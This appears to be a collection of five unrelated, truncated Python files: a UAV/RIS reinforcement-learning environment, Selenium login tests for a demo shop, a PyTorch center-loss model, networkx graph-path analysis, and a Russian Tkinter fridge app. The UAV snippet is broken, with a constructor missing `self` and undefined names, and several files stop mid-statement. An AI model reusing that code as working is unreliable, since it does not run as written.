    "\n\nif sys.version_info.major == 2:\n    import Tkinter as tk\nelse:\n    import tkinter as tk\nimport matplotlib.pyplot as plt\n\nUNIT =  1              \nIOT_H = 100          \nIOT_W = 100          \nMax_Hight = 100        \nMin_Hight = 30         \n\nD_k = 1024\nt_min = 1\nt_max = 3\n\n\nB = 2000  \nN_0 =mt.pow(10, ((-169 / 3) / 10))\nXi =  mt.pow(10, (3/10))\na = 9.61\nb = 0.16  \neta_los = 0.01  \neta_nlos = 0.2  \nA = eta_los - eta_nlos  \nC = 0.2 * np.log10(\n    4 * np.pi * 9 / 3) + eta_nlos  \nPower = 0.5 * mt.pow(10, 3)  \n\n\n\n\n\nclass RIS_UAV(object):\n    def __init__():\n        super(RIS_UAV, self).__init__()\n        self.N_slot = 3000 \n        self.x_s = 10 \n        self.y_s = 10 \n        self.h_s = 2  \n        self.GTs = len(W_K)  \n        self.l_o_v = 100*self.h_s  \n        self.l_f_v = 100*self.h_s  \n        self.l_o_h = [500,600] \n        self.eps =12000 \n        self.finish = False \n        self.w_k = np.zeros((self.GTs, 2), dtype=np.float)  \n        self.u_k = np.zeros((self.GTs, 1), dtype=np.float)  \n        self.w_k=W_K\n        self.u_k=U_K\n        self.W_R = Support \n        self.Z_R = 50  \n        self.M = 100 \n        self.support=Support\n        self.center=Center\n        self.r=R\n    \n        self.action_space_uav_horizontal = ['n', 's', 'e','w','h']\n        self.action_space_uav_vertical = ['a', 'd', 's']\n        self.n_actions  = len(self.action_space_uav_horizontal)*len(self.action_space_uav_vertical)*self.GTs*(np.int(t_max/0.1)-np.int(t_min/0.1)+1)\n        self.n_features = 13 \n\n        self.actions = np.zeros((np.int(self.n_actions),1+4), dtype=np.int)\n        index = 0\n        for h in range(len(self.action_space_uav_horizontal)):\n            for v in range(len(self.action_space_uav_vertical)):\n                for s in range(self.GTs):\n                    for t in range(np.int(t_min/0.1), np.int((t_max)/0.1)+1):\n                        self.actions[index,:]=[index, h, v, s, t]\n                        index = index + 1\n        self._build_ris_uav()\n\n\n\n    def _build_ris_uav(self):\n        self.d_s = np.zeros((self.N_slot, self.GTs), dtype=np.float)  #data processed  #\u6570\u636e\u5904\u7406\n        self.energy = np.zeros((1,self.N_slot), dtype=np.float)  # propulsion  energy of the UAV \u65e0\u4eba\u673a\u7684\u63a8\u8fdb\u80fd\u91cf\n        self.GNs = np.zeros((1, self.GTs), dtype=np.float)\n        return\n\n    def reset(self):\n       \n        self.d_s = np.zeros((self.N_slot, self.GTs), dtype=np.float)  # data processed\n        self.energy = np.zeros((1, self.N_slot), dtype=np.float)  # propulsion  energy of the UAV\n        self.GNs = np.zeros((1, self.GTs), dtype=np.float)\n        self.h_n = 100\n       \n        self.l_n = [50,60]\n        self.server=0\n        self.finish = False\n        self.slot = 0\n\n        return np.array([self.l_n[0], self.l_n[1], self.h_n,self.GNs[0,0],self.GNs[0,1],self.GNs[0,2],self.GNs[0,3],self.GNs[0,4],self.GNs[0,5],self.GNs[0,6],self.GNs[0,7],self.GNs[0,8],self.GNs[0,9]])\n\n    def link_rate (self, gt, RIS):\n        h = self.h_n * self.h_s #*\n        x = self.l_n[0]*self.x_s+0.5*self.x_s #*\n        y = self.l_n[1]*self.y_s+0.5*self.y_s #*  #\u6a2a\u5750\u6807\uff0c\u7eb5\u5750\u6807\n\n        d = np.sqrt(mt.pow(h, 2) + mt.pow(x - self.w_k[gt, 0], 2) + mt.pow(y - self.w_k[gt, 1], 2))#\u65e0\u4eba\u673a\u5230\u5730\u9762\u8282\u70b9\u7684\u6b27\u6c0f\u8ddd\u79bb*\n        d_ug = np.sqrt(mt.pow(h, 2) + mt.pow(x- self.w_k[gt,0],2) + mt.pow(y- self.w_k[gt,1],2))#\u65e0\u4eba\u673a\u5230\u5730\u9762\u8282\u70b9\u7684\u6b27\u6c0f\u8ddd\u79bb*\n        d_ur = np.sqrt(mt.pow(h-self.Z_R, 2) + mt.pow(self.W_R[0] - x, 2) + mt.pow(self.W_R[1] - y, 2))#\u65e0\u4eba\u673a\u5230RIS\u7684\u6b27\u5f0f\u8ddd\u79bb*\n        d_rg = np.sqrt(mt.pow(self.Z_R, 2) + mt.pow(self.W_R[0] - self.w_k[gt, 0], 2) + mt.pow(self.W_R[1] - self.w_k[gt, 1], 2))#RIS\u5230\u5730\u9762\u8282\u70b9\u7684\u6b27\u5f0f\u8ddd\u79bb*\n\n        if (np.sqrt(mt.pow(x- self.w_k[gt,0], 2) + mt.pow(y- self.w_k[gt,1], 2))>0):#\u5982\u679c\u8ddd\u79bb\u5927\u4e8e0\uff0c\u65e0\u4eba\u673a\u5230\u5730\u9762\u8282\u70b9*\n            ratio = h / np.sqrt(mt.pow(x - self.w_k[gt, 0], 2) + mt.pow(y - self.w_k[gt, 1], 2))#\u6bd4\u7387\u4e3ah\u9664\u4ee5d,\u6bd4\u7387\u4e3a\uff085\uff09\u4e2darctan\u5185\u7684\u503c*\n        else:\n            ratio = np.Inf   \n\n        p_los = 1 + a * mt.pow(np.exp(1), (a * b - b * np.arctan(ratio) * (180 / np.pi)))#\u963b\u585e\u6982\u7387\n        p_los = 1 / p_los\n        if RIS==True:\n            g_los = p_los*Power*mt.pow(Xi/(B*N_0*d_ug),2)    #UAV-GT\n            g_nlos =(1-p_los)*Power*mt.pow(self.M*Xi/(B*N_0*d_ur*d_rg),2)#UAV-RIS-GT\n            r = B * np.log2(1 + g_los + g_nlos)\n        if RIS == False:\n            L_km = A * p_los + C\n            r = B * np.log2(1 + Power * mt.pow(L_km/ (B * N_0*d),2))\n        return r/1000\n\n\n    def isout(self,center,r):\n        x = self.l_n[0] * self.x_s + 0.5 * self.x_s\n        y = self.l_n[1] * self.y_s + 0.5 * self.y_s\n        if(np.sqrt(mt.pow(x - center[0], 2) + mt.pow(y - center[1], 2))>r):\n            return True\n        else:\n            return False\n\n    def bad(self,action):\n        h = action[1]  \n        v = action[2]  \n        c_n = action[3]  \n        t_n = action[4]  \n\n        pre_l_n = self.l_n\n        pre_h_n = self.h_n\n\n        self.OtPoI = 0\n        self.enough = 0\n        if v == 0:  # ascending \u63d0\u5347\n            self.h_n = self.h_n + 1\n            if self.h_n > Max_Hight:\n                self.h_n = self.h_n - 1\n                ",
    "from selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.common.action_chains import ActionChains\nimport pytest\nfrom constants.magicStringDenemeleri import *\n\nclass Test_Login:\n    def setup_method(self):#her testen \u00f6nce \u00e7a\u011fr\u0131l\u0131r.\n        self.driver = webdriver.Chrome()\n        self.driver.maximize_window()\n        self.driver.get(\"https://www.saucedemo.com/\")\n        \n    def teardown_method(self):\n        self.driver.quit() \n        \n    def getData():\n        return  [(\"1\",\"1\"),(\"standard_user\",\"secret_sauce\"),(\"onur\",\"secret_sauce\"),(\"problem_user\",\"password\"),(\"user\",\"secret_sauce\")]\n\n    @pytest.mark.parametrize(\"username,password\",getData()) \n    def test_giris(self,username,password):\n        self.driver.get(\"https://www.saucedemo.com/\")\n        WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.ID,username_id)))\n        usernameInput= self.driver.find_element(By.ID,username_id)\n        WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.ID,password_id)))\n        passwordInput = self.driver.find_element(By.ID,password_id)\n        loginbuton=self.driver.find_element(By.ID,login_button_id)\n        loginbuton.click()\n        errormessage=WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.XPATH,userNameErrorMessage_xpath)))\n        assert errormessage.text == userNameErrorMessage_text \n        \n    def test_bosgecis(self):\n        WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.ID,username_id)))\n        userNameInput = self.driver.find_element(By.ID,username_id)\n        WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.ID,password_id)))\n        passwordInput = self.driver.find_element(By.ID,password_id)\n        actions=ActionChains(self.driver)\n        actions.send_keys_to_element(userNameInput,\"pair5\")\n        actions.send_keys_to_element(passwordInput,\"\")\n        loginButton = self.driver.find_element(By.ID,login_button_id)\n        loginButton.click()\n        errormessage=WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.XPATH,passwordErrorMessage_xpath)))\n        #assert errormessage.text == \"Epic sadface: Password is required\" #//*[@id='login_button_container']/div/form/div[3]/h3\n        \n    def test_gecis(self):\n        WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.ID,username_id)))\n        usernameInput= self.driver.find_element(By.ID,username_id)\n        WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.ID,password_id)))\n        passwordInput = self.driver.find_element(By.ID,password_id)\n        actions=ActionChains(self.driver)\n        actions.send_keys_to_element(usernameInput,\"locked_out_user\")\n        actions.send_keys_to_element(passwordInput,\"secret_sauce\")\n        actions.perform()\n        loginbuton=self.driver.find_element(By.ID,login_button_id)\n        loginbuton.click()\n        errormessage=WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.XPATH,lockedErrorMessage_xpath)))\n        assert errormessage.text == lockedErrorMessage_text    \n    \n    def test_gecis1(self):\n        WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.ID,username_id)))\n        usernameInput= self.driver.find_element(By.ID,username_id)\n        WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.ID,password_id)))\n        passwordInput = self.driver.find_element(By.ID,password_id)\n        actions=ActionChains(self.driver)\n        actions.send_keys_to_element(usernameInput,\"standard_user\")\n        actions.send_keys_to_element(passwordInput,\"secret_sauce\")\n        actions.perform()\n        loginbuton=self.driver.find_element(By.ID,login_button_id)\n        loginbuton.click()\n        products=WebDriverWait(self.driver,5).until(EC.visibility_of_element_located((By.CLASS_NAME,productsClassName_text)))\n\n    \n\n        \n    ",
    "import torch\nfrom torch import nn\nimport torchvision\nfrom torch.nn import functional as F\nfrom torch.utils import data\nfrom matplotlib import pyplot as plt\nfrom torchvision import transforms\n\n\nclass CenterLoss(nn.Module):\n    def __init__(self, cls_num, feat_num):\n        super().__init__()\n        self.cls_num = cls_num\n        # \u4e2d\u5fc3\u70b9\u5b9a\u4e3a\u6a21\u578b\u53c2\u6570(\u521d\u59cb\u503c\u4e3a\u968f\u673a\u6570)\n        self.center = nn.Parameter(torch.randn(cls_num, feat_num))\n\n    def forward(self, _x, _y, lamda):\n        center_exp = self.center.index_select(dim=0, index=_y.long())\n        count = torch.histc(_y.float(), bins=self.cls_num, min=0, max=self.cls_num - 1)\n        count_exp = count.index_select(dim=0, index=_y.long())\n        # return lamda / 2 * torch.mean(torch.div(torch.sqrt(\n        # torch.sum(torch.pow(_x - center_exp, 2), dim=1)), count_exp))\n        return lamda / 2 * torch.mean(torch.div(torch.sum(torch.pow((_x - center_exp), 2), dim=1), count_exp))\n\n\nclass ConvLayer(nn.Module):\n    def __init__(self, in_c, out_c, k, s, p, bias=False):\n        super().__init__()\n        self.cnn_layer = nn.Sequential(\n            nn.Conv2d(in_c, out_c, k, s, p, bias=bias),\n            nn.BatchNorm2d(out_c),\n            nn.ReLU()\n        )\n\n    def forward(self, _x):\n        return self.cnn_layer(_x)\n\n\nclass MainNet(nn.Module):\n    def __init__(self):\n        super().__init__()\n        self.hidden_layer = nn.Sequential(\n            # ConvLayer(1, 32, 5, 1, 2),\n            ConvLayer(3, 32, 5, 1, 2),\n            ConvLayer(32, 64, 5, 1, 2),\n            nn.MaxPool2d(2, 2),\n            ConvLayer(64, 128, 5, 1, 2),\n            ConvLayer(128, 256, 5, 1, 2),\n            nn.MaxPool2d(2, 2),\n            ConvLayer(256, 512, 5, 1, 2),\n            ConvLayer(512, 512, 5, 1, 2),\n            nn.MaxPool2d(2, 2),\n            ConvLayer(512, 256, 5, 1, 2),\n            ConvLayer(256, 128, 5, 1, 2),\n            ConvLayer(128, 64, 5, 1, 2),\n            nn.MaxPool2d(2, 2)\n        )\n\n        self.fc = nn.Sequential(\n            # nn.Linear(64, 2)\n            nn.Linear(64 * 2 * 2, 2)\n        )\n\n        self.output_layer = nn.Sequential(\n            # nn.Linear(2, 10)\n            nn.Linear(2, 100)\n        )\n\n    def forward(self, _x):\n        outs = self.hidden_layer(_x)\n        # outs = outs.reshape(-1, 64)\n        outs = outs.reshape(-1, 64 * 2 * 2)\n        feature = self.fc(outs)\n        # outs = torch.log_softmax(self.output_layer(feature), dim=1)\n        outs = self.output_layer(feature)\n        return feature, outs\n\n\ndef visualize(feats, labels, epoch):\n    # plt.ion()\n    plt.clf()\n    color = [\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555'\n    ]\n    for i in range(100):\n        plt.plot(feats[labels == i, 0], feats[labels == i, 1], '.', c=color[i])\n    plt.legend([\n        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n        '10', '11', '12', '13', '14', '15', '16', '17', '18', '19',\n\n        '20', '21', '22', '23', '24', '25', '26', '27', '28', '29',\n        '30', '31', '32', '33', '34', '35', '36', '37', '38', '39',\n\n        '40', '41', '42', '43', '44', '45', '46', '47', '48', '49',\n        '50', '51', '52', '53', '54', '55', '56', '57', '58', '59',\n\n        '60', '61', '62', '63', '64', '65', '66', '67', '68', '69',\n        '70', '71', '72', '73', '74', '75', '76', '77', '78', '79',\n\n        '80', '81', '82', '83', '84', '85', '86', '87', '88', '89',\n        '90', '91', '92', '93', '94', '95', '96', '97', '98', '99',\n    ], loc='upper right')\n    plt.title('epoch=%d' % epoch)\n    plt.savefig('img4/epoch=%d.jpg' % epoch)\n    # plt.pause(0.001)\n    # plt.ioff()\n\n\nif __name__ == '__main__':\n    # \u6d4b\u8bd5\n    # loss_fn = CenterLoss(5, 2)\n    # feat = torch.randn(5, 2, dtype=torch.float32)\n    # y_list = torch.tensor([0, 0, 1, 0, 1], dtype=torch.float32)\n    # loss = loss_fn(feat, y_li",
    "import networkx as nx\nfrom collections import Counter\nimport matplotlib.pyplot as plt\nfrom matplotlib import cm\nimport numpy as np\nimport os\n\ndef create_graph_from_data(data):\n    \"\"\"\u6839\u636e\u7ed9\u5b9a\u7684\u6570\u636e\u5b57\u7b26\u4e32\u521b\u5efa\u56fe\u3002\u6570\u636e\u5e94\u8be5\u6bcf\u884c\u5305\u542b\u4e00\u4e2a\u8fb9\u7684\u4fe1\u606f\uff1a\u6e90\u8282\u70b9 \u76ee\u6807\u8282\u70b9 \u6743\u91cd\u3002\"\"\"\n    graph = nx.Graph()\n    for line in data.split('\\n'):\n        if line.strip():\n            source, target, weight = line.strip().split()\n            graph.add_edge(source, target, weight=int(weight))\n    return graph\n\ndef IdentifySignificantNodes(graph1, graph2, threshold):\n    \"\"\"\u8bc6\u522b\u4e24\u4e2a\u56fe\u4e2d\u91cd\u8981\u7684\u8282\u70b9\u3002\u4e00\u4e2a\u8282\u70b9\u88ab\u8ba4\u4e3a\u662f\u91cd\u8981\u7684,\u5982\u679c\u5b83\u5728\u4e24\u4e2a\u56fe\u4e2d\u7684\u6743\u91cd\u5dee\u5f02\u5927\u4e8e\u9608\u503c\u4e58\u4ee5\u5b83\u4eec\u7684\u6743\u91cd\u548c\u3002\"\"\"\n    significantNodes = []\n    nodes = set(graph1.nodes) | set(graph2.nodes)\n\n    for node in nodes:\n        weight1 = sum(int(graph1[node][neighbor]['weight']) for neighbor in graph1[node]) if node in graph1 else 0\n        weight2 = sum(int(graph2[node][neighbor]['weight']) for neighbor in graph2[node]) if node in graph2 else 0\n        if abs(weight1 - weight2) >= threshold * (weight1 + weight2):\n            significantNodes.append(node)\n\n    return significantNodes\n\ndef FindKCore(graph, significantNodes):\n    \"\"\"\u627e\u5230\u542b\u6709\u91cd\u8981\u8282\u70b9\u7684\u56fe\u7684k\u6838\u3002\u9996\u5148\u79fb\u9664\u4e0d\u662f\u91cd\u8981\u8282\u70b9\u7684\u6240\u6709\u8282\u70b9,\u7136\u540e\u8ba1\u7b97k\u6838\u3002\"\"\"\n    if not significantNodes:\n        return nx.Graph()\n    kCore = graph.copy()\n    kCore.remove_nodes_from([node for node in kCore if node not in significantNodes])\n    kCore = nx.k_core(kCore)\n    return kCore\n\ndef FindCrossTimePathsWithSignificantNodes(graphs, significantNodes):\n    \"\"\"\u5728\u4e00\u7cfb\u5217\u56fe\u4e2d\u627e\u5230\u5305\u542b\u91cd\u8981\u8282\u70b9\u7684\u8de8\u65f6\u95f4\u8def\u5f84\u3002\"\"\"\n    paths = []\n\n    for graph in graphs:\n        significant_nodes_in_graph = [node for node in significantNodes if node in graph]\n        if significant_nodes_in_graph:\n            significant_node = max(significant_nodes_in_graph, key=lambda node: sum(int(graph[node][neighbor]['weight']) for neighbor in graph[node]))\n            nodePaths = nx.single_source_dijkstra_path(graph, significant_node)\n\n            for i in range(len(graphs) - 1):\n                currPaths = nodePaths\n                if significant_node in graphs[i+1]:\n                    nextPaths = nx.single_source_dijkstra_path(graphs[i+1], significant_node)\n                    for endNode in currPaths:\n                        if endNode in nextPaths and endNode in significantNodes:\n                            nextPath = nextPaths[endNode]\n                            paths.append(currPaths[endNode] + nextPath[1:])\n    return paths\n\ndef FindRelaxedPathsWithSignificantNodes(graphs, significantNodes):\n    \"\"\"\u5728\u4e00\u7cfb\u5217\u56fe\u4e2d\u627e\u5230\u5305\u542b\u91cd\u8981\u8282\u70b9\u7684\u653e\u677e\u8def\u5f84\u3002\u4e0d\u540c\u4e8e\u8de8\u65f6\u95f4\u8def\u5f84,\u653e\u677e\u8def\u5f84\u4e0d\u8981\u6c42\u8def\u5f84\u5728\u6bcf\u4e2a\u56fe\u4e2d\u90fd\u662f\u6700\u77ed\u7684\u3002\"\"\"\n    paths = []\n\n    for graph in graphs:\n        nodePaths = {}\n        for node in significantNodes:\n            if node in graph:\n                nodePaths.update(nx.single_source_dijkstra_path(graph, node))\n\n        for i in range(len(graphs) - 1):\n            currPaths = nodePaths\n            nextPaths = {}\n            for node in significantNodes:\n                if node in graphs[i+1]:\n                    nextPaths.update(nx.single_source_dijkstra_path(graphs[i+1], node))\n            for endNode, path in currPaths.items():\n                if endNode in nextPaths:\n                    nextPath = nextPaths[endNode]\n                    newPath = path + nextPath[1:]\n                    if not paths or len(newPath) < len(paths[-1]):\n                        paths.append(newPath)\n\n    return paths\n\ndef ExtractFrequentEdges(paths, frequency_threshold=0.1):\n    \"\"\"\u4ece\u4e00\u7cfb\u5217\u8def\u5f84\u4e2d\u63d0\u53d6\u51fa\u73b0\u9891\u7387\u8d85\u8fc7\u9608\u503c\u7684\u8fb9\u3002\"\"\"\n    edgePaths = {}\n    counter = Counter()\n\n    for path in paths:\n        for i in range(len(path) - 1):\n            edge = (path[i], path[i+1])\n            counter[edge] += 1\n\n    for edge, count in counter.items():\n        if count >= frequency_threshold * len(paths):\n            edgePaths[edge] = []\n            for path in paths:\n                if edge[0] in path and edge[1] in path:\n                    edgePaths[edge].append(path)\n\n    return edgePaths\n\ndef visualize_graph(graph, title, node_color, filename):\n    \"\"\"\u4f7f\u7528matplotlib\u53ef\u89c6\u5316\u4e00\u4e2a\u56fe,\u5c06\u7ed3\u679c\u4fdd\u5b58\u4e3a\u6587\u4ef6\u3002\"\"\"\n    if not graph.edges():\n        print(f\"{title} is empty. Skipping visualization.\")\n    else:\n        plt.figure(figsize=(8, 6))\n        pos = nx.spring_layout(graph)\n        nx.draw_networkx(graph, pos, node_size=500, node_color=node_color, font_size=12, font_weight='bold', edge_color='gray', width=1.5, with_labels=True)\n        labels = nx.get_edge_attributes(graph, 'weight')\n        nx.draw_networkx_edge_labels(graph, pos, edge_labels=labels)\n        plt.title(title)\n        plt.axis('off')\n        plt.tight_layout()\n        \n        static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static', 'images')\n        os.makedirs(static_dir, exist_ok=True)\n        plt.savefig(os.path.join(static_dir, filename), dpi=300)\n        plt.close()\n\ndef visualize_paths(paths, title, node_color, filename):\n    \"\"\"\u4f7f\u7528matplotlib\u53ef\u89c6\u5316\u4e00\u7cfb\u5217\u8def\u5f84,\u5c06\u7ed3\u679c\u4fdd\u5b58\u4e3a\u6587\u4ef6\u3002\"\"\"\n    if not paths:\n        print(f\"No {title} found. Skipping visualization.\")\n    else:\n        plt.figure(figsize=(12, 10))\n        G_visual = nx.Graph()\n        colors = cm.rainbow(np.linspace(0,",
    "import os\r\nfrom tkinter import messagebox, ttk\r\nfrom tkinter import *\r\nimport tkinter as tk\r\nfrom tkinter import scrolledtext\r\nfrom PIL import ImageTk, Image\r\nimport datetime\r\nimport requests\r\nfrom deep_translator import GoogleTranslator\r\nfrom io import BytesIO\r\n\r\n\r\ndef next_page():\r\n    global root1, bg_image\r\n    root1.destroy()\r\n    root2 = tk.Tk()\r\n    root2.title(\"\u0423\u043c\u043d\u044b\u0439 \u0425\u043e\u043b\u043e\u0434\u0438\u043b\u044c\u043d\u0438\u043a!\")\r\n    root2.geometry(\"1300x600\")\r\n\r\n    icon1 = ImageTk.PhotoImage(file='Subtract (1).png')\r\n    root2.wm_iconbitmap()\r\n    root2.iconphoto(False, icon1)\r\n\r\n    image1 = Image.open(\"fon.png\")\r\n    bg_image = ImageTk.PhotoImage(image1)\r\n    background_label1 = Label(root2, image=bg_image)\r\n    background_label1.place(x=0, y=0, relwidth=1, relheight=1)\r\n\r\n    label = tk.Label(root2, text='''\u0414\u043e\u0431\u0440\u043e \u043f\u043e\u0436\u0430\u043b\u043e\u0432\u0430\u0442\u044c \u0432 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \"\u0423\u043c\u043d\u044b\u0439 \u0425\u043e\u043b\u043e\u0434\u0438\u043b\u044c\u043d\u0438\u043a\"!\r\n    \r\n    \u0417\u0434\u0435\u0441\u044c \u0432\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u043b\u0435\u0433\u043a\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u044b, \u0441\u043b\u0435\u0434\u0438\u0442\u044c \u0437\u0430 \u0438\u0445 \r\n    \u0441\u0440\u043e\u043a\u043e\u043c \u0433\u043e\u0434\u043d\u043e\u0441\u0442\u0438, \u043f\u043e\u043b\u0443\u0447\u0430\u0442\u044c \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u044f \u043e \u0435\u0433\u043e \u0438\u0441\u0442\u0435\u0447\u0435\u043d\u0438\u0438 \u0438 \r\n    \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u044c \u0440\u0435\u0446\u0435\u043f\u0442\u044b \u0434\u043b\u044f \u043f\u0440\u0438\u0433\u043e\u0442\u043e\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u043a\u0443\u0441\u043d\u044b\u0445 \u0431\u043b\u044e\u0434.\r\n\r\n  \u0413\u043e\u0442\u043e\u0432\u044c\u0442\u0435 \u0441 \u0443\u0434\u043e\u0432\u043e\u043b\u044c\u0441\u0442\u0432\u0438\u0435\u043c \u0438 \u0431\u0435\u0437 \u043b\u0438\u0448\u043d\u0438\u0445 \u0437\u0430\u0431\u043e\u0442!''', bg='#F6EFE4', fg=\"#C5A483\", font=(\"Corbel bold\", 25))\r\n    label.pack(anchor=CENTER, pady=100)\r\n    button = tk.Button(root2, text=\"\u041f\u0435\u0440\u0435\u0439\u0442\u0438 \u0432 \\n \u0445\u043e\u043b\u043e\u0434\u0438\u043b\u044c\u043d\u0438\u043a\", fg=\"#B5977A\", bg=\"#E8CAAC\",\r\n                       font=(\"Corbel bold\", 20), command=root2.destroy)\r\n    button.config(width=20, height=2)\r\n    button.pack(anchor='center')\r\n\r\n\r\ndef show_image():\r\n    global image_label\r\n    image_label = tk.Label(root1)\r\n    image_label.pack()\r\n    image_label.config(image=image)\r\n    root1.geometry(\"\")\r\n    root1.title(\"\u0423\u043c\u043d\u044b\u0439 \u0425\u043e\u043b\u043e\u0434\u0438\u043b\u044c\u043d\u0438\u043a!\")\r\n    root1.after(2000, lambda: image_label.destroy())\r\n    root1.after(2000, next_page)\r\n\r\n\r\nroot1 = tk.Tk()\r\nroot1.geometry(\"\")\r\nimage = tk.PhotoImage(file=\"image-png.ppm\")\r\nshow_image()\r\n\r\nicon = ImageTk.PhotoImage(file='Subtract (1).png')\r\nroot1.iconphoto(False, icon)\r\n\r\nroot1.mainloop()\r\n\r\nroot = Tk()\r\nroot.title(\"\u0423\u043c\u043d\u044b\u0439 \u0445\u043e\u043b\u043e\u0434\u0438\u043b\u044c\u043d\u0438\u043a\")\r\nroot.geometry('600x450+400+200')\r\nroot.wm_iconbitmap()\r\n\r\nicon2 = ImageTk.PhotoImage(file='Subtract (1).png')\r\nroot.iconphoto(False, icon2)\r\n\r\nroot_bg = Image.open(\"fon.png\")\r\nbg_image = ImageTk.PhotoImage(root_bg)\r\n\r\nbackground_label = Label(root, image=bg_image)\r\nbackground_label.place(x=0, y=0, relwidth=1, relheight=1)\r\n\r\nlabel = Label(root, text='\u0425\u041e\u041b\u041e\u0414\u0418\u041b\u042c\u041d\u0418\u041a', foreground=\"#B5977A\", background=\"#F6EFE4\", font=(\"Corbel bold\", 15))\r\nlabel.pack()\r\n\r\nstyle = ttk.Style()\r\nstyle.configure(\"Treeview\", foreground=\"#AC9075\", font=(\"Corbel bold\", 12))\r\n\r\ncolumns = [\"\u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u0430\", \"\u0421\u0440\u043e\u043a \u0433\u043e\u0434\u043d\u043e\u0441\u0442\u0438\", \"\u041a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044f\"]\r\ntable = ttk.Treeview(root, columns=columns, show=\"headings\", style='Treeview')\r\n\r\nfor col in columns:\r\n    table.heading(col, text=col)\r\ntable.pack()\r\n\r\nexample = [\r\n    (\"\u041c\u043e\u0440\u043a\u043e\u0432\u044c\", \"2024-03-26\", \"\u041e\u0432\u043e\u0449\u0438\"),\r\n    (\"\u041c\u043e\u043b\u043e\u043a\u043e\", \"2024-03-24\", \"\u041c\u043e\u043b\u043e\u0447\u043d\u044b\u0435 \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u044b\"),\r\n    (\"\u0412\u0430\u0442\u0440\u0443\u0448\u043a\u0430\", \"2024-03-16\", \"\u0412\u044b\u043f\u0435\u0447\u043a\u0430\"),\r\n    (\"\u042f\u0431\u043b\u043e\u043a\u043e\", \"2024-04-23\", \"\u0424\u0440\u0443\u043a\u0442\u044b\"),\r\n    (\"\u041a\u0443\u0440\u0438\u0446\u0430\", \"2024-12-12\", \"\u041c\u044f\u0441\u043e \u0438 \u043f\u0442\u0438\u0446\u0430\")\r\n]\r\n\r\n\r\ndef check_expiration_date():\r\n    now = datetime.datetime.now().date()\r\n    for row in table.get_children():\r\n        item = table.item(row)[\"values\"]\r\n        expiration_date = item[1]\r\n\r\n        # \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u0442\u044c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u043e\u0431\u044a\u0435\u043a\u0442 datetime.date\r\n        expiration_date = datetime.datetime.strptime(expiration_date, \"%Y-%m-%d\").date()\r\n        if expiration_date - now <= datetime.timedelta(days=0):\r\n            messagebox.showwarning(\"\u0423\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u0435\", f\"\u0421\u0440\u043e\u043a \u0433\u043e\u0434\u043d\u043e\u0441\u0442\u0438 \u0442\u043e\u0432\u0430\u0440\u0430 \\\"{item[0]}\\\" \u0438\u0441\u0442\u0435\u043a.\")\r\n\r\n        elif expiration_date - now <= datetime.timedelta(days=3):\r\n            messagebox.showwarning(\"\u0423\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u0435\", f\"\u0421\u0440\u043e\u043a \u0433\u043e\u0434\u043d\u043e\u0441\u0442\u0438 \u0442\u043e\u0432\u0430\u0440\u0430 \\\"{item[0]}\\\" \u043f\u043e\u0434\u0445\u043e\u0434\u0438\u0442 \u043a \u043a\u043e\u043d\u0446\u0443.\")\r\n\r\n\r\nfor i in example:\r\n    table.insert(\"\", \"end\", values=i)\r\nselected_category = \"\"\r\n\r\n\r\ndef open_second_window():\r\n    def add_to_table_with_category():\r\n        l = Label(second_window, 